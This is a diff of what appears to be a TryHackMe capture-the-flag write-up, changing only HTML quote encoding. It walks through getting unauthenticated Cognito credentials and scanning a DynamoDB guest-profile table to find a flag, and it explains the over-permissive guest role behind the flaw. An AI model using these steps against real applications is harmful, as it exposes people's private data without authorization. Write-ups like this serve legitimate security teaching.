@@ -72,20 +72,20 @@
 <p>The instructions indicate that the application is using AWS in the <code>us-east-1</code> region.</p>
 <p>We can request an identity from the Cognito Identity Pool:</p>
 <div class="highlight"><pre><span></span><code>aws<span class="w"> </span>cognito-identity<span class="w"> </span>get-id<span class="w"> </span><span class="se">\</span>
---identity-pool-id<span class="w"> </span><span class="s2">"us-east-1:836c0949-292d-485b-b532-52d5ca7bb688"</span><span class="w"> </span><span class="se">\</span>
---region<span class="w"> </span><span class="s2">"us-east-1"</span>
+--identity-pool-id<span class="w"> </span><span class="s2">&quot;us-east-1:836c0949-292d-485b-b532-52d5ca7bb688&quot;</span><span class="w"> </span><span class="se">\</span>
+--region<span class="w"> </span><span class="s2">&quot;us-east-1&quot;</span>
 </code></pre></div>
 
 <p>The command returns an <code>IdentityId</code>:</p>
 <div class="highlight"><pre><span></span><code><span class="p">{</span>
-<span class="w">    </span><span class="nt">"IdentityId"</span><span class="p">:</span><span class="w"> </span><span class="s2">"us-east-1:4d571309-b0b3-c3d8-3974-9ff9ab40e6a8"</span>
+<span class="w">    </span><span class="nt">&quot;IdentityId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;us-east-1:4d571309-b0b3-c3d8-3974-9ff9ab40e6a8&quot;</span>
 <span class="p">}</span>
 </code></pre></div>
 
 <p>Next, request temporary AWS credentials for this identity:</p>
 <div class="highlight"><pre><span></span><code>aws<span class="w"> </span>cognito-identity<span class="w"> </span>get-credentials-for-identity<span class="w"> </span><span class="se">\</span>
---identity-id<span class="w"> </span><span class="s2">"us-east-1:4d571309-b0b3-c3d8-3974-9ff9ab40e6a8"</span><span class="w"> </span><span class="se">\</span>
---region<span class="w"> </span><span class="s2">"us-east-1"</span>
+--identity-id<span class="w"> </span><span class="s2">&quot;us-east-1:4d571309-b0b3-c3d8-3974-9ff9ab40e6a8&quot;</span><span class="w"> </span><span class="se">\</span>
+--region<span class="w"> </span><span class="s2">&quot;us-east-1&quot;</span>
 </code></pre></div>
 
 <p>The response contains an <code>AccessKeyId</code>, <code>SecretKey</code>, and <code>SessionToken</code>. These are temporary credentials, so they should be used immediately and should not be published in a writeup.</p>
@@ -94,7 +94,7 @@
 </code></pre></div>
 
 <p>Enter the temporary access key and secret key when prompted. The session token can be set separately:</p>
-<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span><span class="s2">"YOUR_SESSION_TOKEN"</span>
+<div class="highlight"><pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span><span class="s2">&quot;YOUR_SESSION_TOKEN&quot;</span>
 </code></pre></div>
 
 <p>The table name can be found in the application:</p>
@@ -103,13 +103,13 @@
 </blockquote>
 <p>Now scan the DynamoDB table:</p>
 <div class="highlight"><pre><span></span><code>aws<span class="w"> </span>dynamodb<span class="w"> </span>scan<span class="w"> </span><span class="se">\</span>
---table-name<span class="w"> </span><span class="s2">"complimentary-GuestWellnessProfiles"</span><span class="w"> </span><span class="se">\</span>
---region<span class="w"> </span><span class="s2">"us-east-1"</span><span class="w"> </span><span class="se">\</span>
+--table-name<span class="w"> </span><span class="s2">&quot;complimentary-GuestWellnessProfiles&quot;</span><span class="w"> </span><span class="se">\</span>
+--region<span class="w"> </span><span class="s2">&quot;us-east-1&quot;</span><span class="w"> </span><span class="se">\</span>
 &gt;<span class="w"> </span>final.json
 </code></pre></div>
 
 <p>The scan returns the guest profiles stored in the table. Searching the output for <code>THM{</code> reveals the flag:</p>
-<div class="highlight"><pre><span></span><code>grep<span class="w"> </span>-o<span class="w"> </span><span class="s1">'THM{[^}]*}'</span><span class="w"> </span>final.json
+<div class="highlight"><pre><span></span><code>grep<span class="w"> </span>-o<span class="w"> </span><span class="s1">&#39;THM{[^}]*}&#39;</span><span class="w"> </span>final.json
 </code></pre></div>
 
 <p>The vulnerability exists because the unauthenticated guest role is allowed to perform a full DynamoDB <code>Scan</code>, even though the application is only supposed to retrieve an individual guest profile.</p>
